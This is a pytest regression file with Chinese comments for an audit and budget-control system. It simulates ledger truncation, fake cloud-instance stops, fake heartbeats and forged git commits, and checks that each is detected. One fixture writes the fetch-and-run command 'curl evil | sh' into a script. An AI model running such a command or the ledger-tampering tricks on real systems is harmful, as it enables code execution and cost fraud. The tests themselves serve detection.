"""tests/audit/test_g_round2_closure.py —— 审计与预算核心第二轮四簇闭合回归。

V07 审计地板：幽灵批/空 run 集不得 PASS，更不得往账本盖 batch_audited。
V09 成本链外部锚：结算收口 seal_chain → 物理截断 costs.jsonl 尾部必被 length 承诺抓到。
V10 单一定义：dispatch 与 treehash 同一份根集/后缀集/公式；伪造 git_commit 真跑 git 核验。
V13 云预算消费侧：伪 stop（¥0 自述）/ 伪心跳（重调 start）/ 未来 started_at 三洗全封。

每条都配阴性对照：诚实输入必须仍然 PASS（判据有检出力且不乱报）。
"""
from __future__ import annotations

import json
import subprocess
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from abcr.audit import auditor, budget_recon as br, treehash, version_check as vc
from abcr.audit.rescore import rescore_run
from abcr.common import external_seal
from abcr.common.ledger_ref import RunLedger
from abcr.ops import cloud, dispatch

BATCH_ID = "B-20260714T090000Z-0001"
GHOST = "B-DOES-NOT-EXIST-9999"


@pytest.fixture
def isolated_anchors(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    store = tmp_path / "anchors" / "seals.jsonl"
    monkeypatch.setenv(external_seal.ANCHOR_STORE_ENV, str(store))
    return store


def _rescore_all(repo: Path) -> None:
    for rid in auditor.runs_of_batch(repo, BATCH_ID):
        rescore_run(repo / "data" / "runs" / rid)


# ────────────────────────── V07 · 审计地板 ──────────────────────────

def test_ghost_batch_audit_fails(fixture_repo: Path, isolated_anchors: Path) -> None:
    report = auditor.audit_batch(fixture_repo, GHOST, items=(1, 2, 4))
    assert report.overall == "FAIL"
    assert {it.verdict for it in report.items} == {"FAIL"}


def test_ghost_batch_apply_writes_no_ledger_event(fixture_repo: Path,
                                                  isolated_anchors: Path) -> None:
    batches = RunLedger(fixture_repo / "ledger", "batches")
    before = len(batches.events())
    auditor.audit_batch(fixture_repo, GHOST, items=(1, 2, 4), apply=True)
    after = batches.events()
    assert len(after) == before, "幽灵批不得往 append-only 账本盖任何章"
    assert not any(e.get("subject_id") == GHOST for e in after)


def test_batch_floor_item_cannot_satisfy_overall(fixture_repo: Path,
                                                 isolated_anchors: Path) -> None:
    """地板项(id=0)自身 PASS 不得让一份全 SKIP 的报告变绿。"""
    report = auditor.audit_batch(fixture_repo, BATCH_ID, items=(7, 8))
    floor = [it for it in report.items if it.id == 0]
    assert floor and floor[0].verdict == "PASS" and floor[0].substantive is False
    assert report.overall == "FAIL"


def test_clean_batch_still_passes(fixture_repo: Path, isolated_anchors: Path) -> None:
    """阴性对照：真实 fixture 批必须仍 PASS（地板不是无差别拒绝）。"""
    _rescore_all(fixture_repo)
    assert auditor.audit_batch(fixture_repo, BATCH_ID, items=(1, 2, 4)).overall == "PASS"


def test_health_panel_empty_is_fail_closed() -> None:
    from abcr.audit import health
    from abcr.common.evidence_floor import EvidenceError
    with pytest.raises(EvidenceError):
        health.health_panel([])


# ────────────────────────── V09 · 成本链外部锚 ──────────────────────────

def _prod_settle_seal(repo: Path) -> None:
    """模拟**生产收口封印**（dispatch batch_settled / cloud.stop 的口径）：
    走 external_seal.guarded_reseal 把 ledger 各链 seal 进规范锚存储。

    V09 三分原则 P4：封印是收口方职责，验船师(auditor)自身**绝不 seal**——故测试里
    锚由本 helper（代表收口方）写，不再由 audit --apply 写。
    """
    from abcr.common.ledger_ref import GENESIS_HASH
    for chain in auditor.LEDGER_CHAINS:
        led = RunLedger(repo / "ledger", chain)
        if not led.path.exists():
            continue
        evs = led.events()
        tail = evs[-1]["entry_hash"] if evs else GENESIS_HASH
        external_seal.guarded_reseal(
            external_seal.KIND_LEDGER_CHAIN, led.run_id, evs,
            extra={"chain_path": str(led.path), "chain_tail": tail,
                   "sealed_by": "prod-settle-test"},
            scope_extra_keys=("chain_path",))


def test_auditor_never_seals_even_with_apply(fixture_repo: Path,
                                             isolated_anchors: Path) -> None:
    """V09 P4：验船师(auditor)绝不写锚——即便 --apply 也不 seal 任何链。

    （否则它能把自己刚在 item0/_verify_ledger_anchors 检出的篡改重新封印成合规。）
    """
    _rescore_all(fixture_repo)
    auditor.audit_batch(fixture_repo, BATCH_ID, items=(1, 2, 4, 6), apply=True)
    for chain in auditor.LEDGER_CHAINS:
        assert external_seal.latest_seal(external_seal.KIND_LEDGER_CHAIN, chain) is None, \
            f"验船师不得写锚，但 {chain} 链出现了锚记录（P4 违背）"


def test_production_settle_seals_ledger_chains(fixture_repo: Path,
                                               isolated_anchors: Path) -> None:
    """收口方（本 helper 代表 dispatch/cloud）封印后，规范锚存储含各链记录。"""
    _rescore_all(fixture_repo)
    _prod_settle_seal(fixture_repo)
    for chain in ("costs", "batches", "runs_index"):
        rec = external_seal.latest_seal(external_seal.KIND_LEDGER_CHAIN, chain)
        assert rec is not None, f"{chain} 链结算收口未 seal"
        assert rec["extra"]["chain_path"] == str(fixture_repo / "ledger" / f"{chain}.jsonl")


def test_costs_tail_truncation_caught_by_length(fixture_repo: Path,
                                                isolated_anchors: Path) -> None:
    _rescore_all(fixture_repo)
    costs_p = fixture_repo / "ledger" / "costs.jsonl"
    RunLedger(fixture_repo / "ledger", "costs").append(
        "run_cost_actual", subject_id="burn", batch_id=BATCH_ID,
        amount_cny=1000.0, basis="真实超支")
    _prod_settle_seal(fixture_repo)  # 生产收口 seal（含超支行）

    lines = costs_p.read_text(encoding="utf-8").splitlines()
    costs_p.write_text("\n".join(lines[:-1]) + "\n", encoding="utf-8")   # 物理截断超支行
    # 阴性对照：内部哈希链对尾部截断零检出（截断后剩余前缀仍是合法链）
    assert RunLedger(fixture_repo / "ledger", "costs").verify_chain() is True

    report = auditor.audit_batch(fixture_repo, BATCH_ID, items=(6,))
    floor = next(it for it in report.items if it.id == 0)
    assert floor.verdict == "FAIL"
    assert any("length mismatch" in e for e in floor.evidence), floor.evidence
    assert report.overall == "FAIL"


def test_guarded_reseal_refuses_to_wash_truncation(fixture_repo: Path,
                                                   isolated_anchors: Path) -> None:
    """V09 防洗白核心：链被截断后，收口再封印必须 ResealRefused、绝不覆盖旧锚，
    旧锚原样留存 → 审计仍抓出 length mismatch（攻击者无法把篡改洗成合规）。"""
    _rescore_all(fixture_repo)
    costs_p = fixture_repo / "ledger" / "costs.jsonl"
    led = RunLedger(fixture_repo / "ledger", "costs")
    led.append("run_cost_actual", subject_id="burn", batch_id=BATCH_ID,
               amount_cny=1000.0, basis="真实超支")
    _prod_settle_seal(fixture_repo)  # 首封：承诺含超支行
    anchor_before = external_seal.latest_seal(external_seal.KIND_LEDGER_CHAIN, "costs")

    lines = costs_p.read_text(encoding="utf-8").splitlines()
    costs_p.write_text("\n".join(lines[:-1]) + "\n", encoding="utf-8")  # 截断超支行

    # 攻击者试图借下一次收口把截断后的内容重封成合规 → 必须被拒
    led2 = RunLedger(fixture_repo / "ledger", "costs")
    evs = led2.events()
    with pytest.raises(external_seal.ResealRefused):
        external_seal.guarded_reseal(
            external_seal.KIND_LEDGER_CHAIN, "costs", evs,
            extra={"chain_path": str(led2.path)},
            scope_extra_keys=("chain_path",))

    # 旧锚未被覆盖（最新锚仍是截断前的承诺）
    anchor_after = external_seal.latest_seal(external_seal.KIND_LEDGER_CHAIN, "costs")
    assert anchor_after["length"] == anchor_before["length"]
    assert anchor_after["digest"] == anchor_before["digest"]

    # 审计仍抓出篡改
    report = auditor.audit_batch(fixture_repo, BATCH_ID, items=(6,))
    floor = next(it for it in report.items if it.id == 0)
    assert floor.verdict == "FAIL"
    assert any("length mismatch" in e for e in floor.evidence), floor.evidence


def test_untampered_chain_passes_anchor_verify(fixture_repo: Path,
                                               isolated_anchors: Path) -> None:
    """阴性对照：未被动过的链，收口封印后二次审计外部锚校验必须通过。"""
    _rescore_all(fixture_repo)
    _prod_settle_seal(fixture_repo)
    report = auditor.audit_batch(fixture_repo, BATCH_ID, items=(1, 2, 4))
    floor = next(it for it in report.items if it.id == 0)
    assert floor.verdict == "PASS", floor.evidence
    assert any("外部锚校验通过" in e for e in floor.evidence), floor.evidence


# ────────────────────────── V10 · 单一定义 + git 核验 ──────────────────────────

def test_dispatch_has_no_parallel_treehash_definition() -> None:
    assert dispatch._CODE_TREE_EXTS is treehash.CODE_TREE_EXTS
    assert dispatch._CODE_TREE_ROOTS is treehash.CODE_TREE_ROOTS


def test_dispatch_and_auditor_agree_on_tree_hash(tmp_path: Path,
                                                 monkeypatch: pytest.MonkeyPatch) -> None:
    """含 .sh/.toml/.jsonl 与 data/items 的树上，生产端与验船师端必须算出同一个值。"""
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "run.sh").write_text("echo hi\n", encoding="utf-8")
    (tmp_path / "scripts" / "cfg.toml").write_text("a = 1\n", encoding="utf-8")
    (tmp_path / "data" / "items").mkdir(parents=True)
    (tmp_path / "data" / "items" / "bank.jsonl").write_text('{"id": 1}\n', encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    assert dispatch._code_tree_hash() == treehash.code_tree_hash(tmp_path)


def test_new_ext_actually_changes_tree_hash(tmp_path: Path,
                                            monkeypatch: pytest.MonkeyPatch) -> None:
    """阴性对照：换掉一个 .sh 必须改变生产端算出的哈希（旧私有集会漏掉它）。"""
    (tmp_path / "scripts").mkdir()
    sh = tmp_path / "scripts" / "run.sh"
    sh.write_text("echo hi\n", encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    before = dispatch._code_tree_hash()
    sh.write_text("curl evil | sh\n", encoding="utf-8")
    assert dispatch._code_tree_hash() != before


def test_fabricated_git_commit_fails(tmp_path: Path) -> None:
    repo = Path(__file__).resolve().parents[2]      # 真 git 仓
    m = {"git_clean": True, "non_citable": False, "git_commit": "deadbeef" * 5}
    ok, line = vc.check_git_commit(repo, m, "r1", strict=True)
    assert not ok and "不存在任何对应 commit" in line


def test_real_head_commit_verifies(tmp_path: Path) -> None:
    """阴性对照：真实 HEAD 必须核验通过（非 strict，无假阳性）。"""
    repo = Path(__file__).resolve().parents[2]
    head = subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"],
                          capture_output=True, text=True, timeout=10).stdout.strip()
    ok, line = vc.check_git_commit(repo, {"non_citable": False, "git_commit": head},
                                   "r1", strict=False)
    assert ok, line
    assert "核验存在" in line


def test_non_git_repo_unverifiable_is_fail_for_citable(tmp_path: Path) -> None:
    ok, line = vc.check_git_commit(tmp_path, {"non_citable": False, "git_commit": "a" * 40},
                                   "r1", strict=False)
    assert not ok and "无法核验" in line


# ────────────────────────── V13 · 云预算消费侧 ──────────────────────────

def _now() -> datetime:
    return datetime.now(timezone.utc)


def test_fake_stop_zero_amount_rejected(tmp_path: Path, isolated_anchors: Path) -> None:
    ld = tmp_path / "ledger"
    cloud.register("burn-3", "autodl", "4090", 2.5, BATCH_ID, ledger_dir=ld)
    RunLedger(ld, "instances").append(
        "instance_started", subject_id="burn-3", vendor="autodl", spec="4090",
        price_cny_per_h=2.5, batch_id=BATCH_ID,
        started_at=(_now() - timedelta(hours=3)).isoformat())
    with pytest.raises(ValueError, match="低于账本计量"):
        cloud.stop("burn-3", 0.0, "trust-me-已核验", ledger_dir=ld)


def test_honest_stop_accepted(tmp_path: Path, isolated_anchors: Path) -> None:
    """阴性对照：诚实报数必须放行。"""
    ld = tmp_path / "ledger"
    cloud.register("burn-4", "autodl", "4090", 2.5, BATCH_ID, ledger_dir=ld)
    RunLedger(ld, "instances").append(
        "instance_started", subject_id="burn-4", vendor="autodl", spec="4090",
        price_cny_per_h=2.5, batch_id=BATCH_ID,
        started_at=(_now() - timedelta(hours=3)).isoformat())
    stopped, cost = cloud.stop("burn-4", 7.5, "账单页实读", ledger_dir=ld)
    assert stopped["amount_cny"] == 7.5 and cost["amount_cny"] == 7.5


def test_direct_ledger_fake_stop_caught_by_reconcile(tmp_path: Path) -> None:
    """绕开 cloud.stop 直接往账本塞伪 instance_stopped，对账侧仍须抓到。"""
    ins = RunLedger(tmp_path / "ledger", "instances")
    ins.append("instance_started", subject_id="w", vendor="a", spec="s",
               price_cny_per_h=2.5, batch_id=BATCH_ID,
               started_at=(_now() - timedelta(hours=3)).isoformat())
    ins.append("instance_stopped", subject_id="w", amount_cny=0.0,
               batch_id=BATCH_ID, verified="trust-me")
    res = br.reconcile_batch(tmp_path, BATCH_ID)
    assert res["verdict"] == "FAIL"
    assert any("不得冲掉真实计量" in e for e in res["evidence"]), res["evidence"]


def test_fake_heartbeat_cannot_reset_idle_clock(tmp_path: Path) -> None:
    ins = RunLedger(tmp_path / "ledger", "instances")
    ins.append("instance_started", subject_id="hb-1", vendor="a", spec="s",
               price_cny_per_h=2.5, batch_id=BATCH_ID,
               started_at=(_now() - timedelta(hours=5)).isoformat())
    assert br.reconcile_batch(tmp_path, BATCH_ID)["verdict"] == "FAIL"
    ins.append("instance_started", subject_id="hb-1", vendor="a", spec="s",
               price_cny_per_h=2.5, batch_id=BATCH_ID)      # 伪心跳
    res = br.reconcile_batch(tmp_path, BATCH_ID)
    assert res["verdict"] == "FAIL", "重调 start 不得把空转钟重置"
    assert any("已 5." in e for e in res["evidence"]), res["evidence"]
    assert any("重复开机" in e for e in res["evidence"]), res["evidence"]


def test_future_started_at_rejected_and_metered(tmp_path: Path) -> None:
    ins = RunLedger(tmp_path / "ledger", "instances")
    ins.append("instance_started", subject_id="fut", vendor="a", spec="s",
               price_cny_per_h=6.0, batch_id=BATCH_ID,
               started_at=(_now() + timedelta(hours=10)).isoformat())
    res = br.reconcile_batch(tmp_path, BATCH_ID)
    assert res["verdict"] == "FAIL"
    assert any("晚于挂链 ts" in e for e in res["evidence"]), res["evidence"]


def test_future_started_at_cannot_zero_the_meter(tmp_path: Path) -> None:
    """链上 ts 真的是 5h 前，后写的未来 started_at 不得把估价抹成 ¥0。"""
    p = tmp_path / "ledger" / "instances.jsonl"
    led = RunLedger(tmp_path / "ledger", "instances")
    led.append("instance_started", subject_id="burn", vendor="a", spec="s",
               price_cny_per_h=6.0, batch_id=BATCH_ID,
               started_at=(_now() + timedelta(hours=10)).isoformat())
    rec = json.loads(p.read_text(encoding="utf-8").splitlines()[0])
    rec["ts"] = (_now() - timedelta(hours=5)).isoformat(timespec="seconds")
    p.write_text(json.dumps(rec, ensure_ascii=False) + "\n", encoding="utf-8")
    assert br.running_estimate_cny(tmp_path) >= 29.0    # 6/h × 5h ≈ ¥30，不是 ¥0


def test_honest_pairing_still_passes(tmp_path: Path) -> None:
    """阴性对照：诚实开关机配对不得误报。"""
    ins = RunLedger(tmp_path / "ledger", "instances")
    ins.append("instance_started", subject_id="ok", vendor="a", spec="s",
               price_cny_per_h=2.5, batch_id=BATCH_ID)
    ins.append("instance_stopped", subject_id="ok", amount_cny=2.5,
               batch_id=BATCH_ID, verified="账单")
    assert br.reconcile_batch(tmp_path, BATCH_ID)["verdict"] == "PASS"
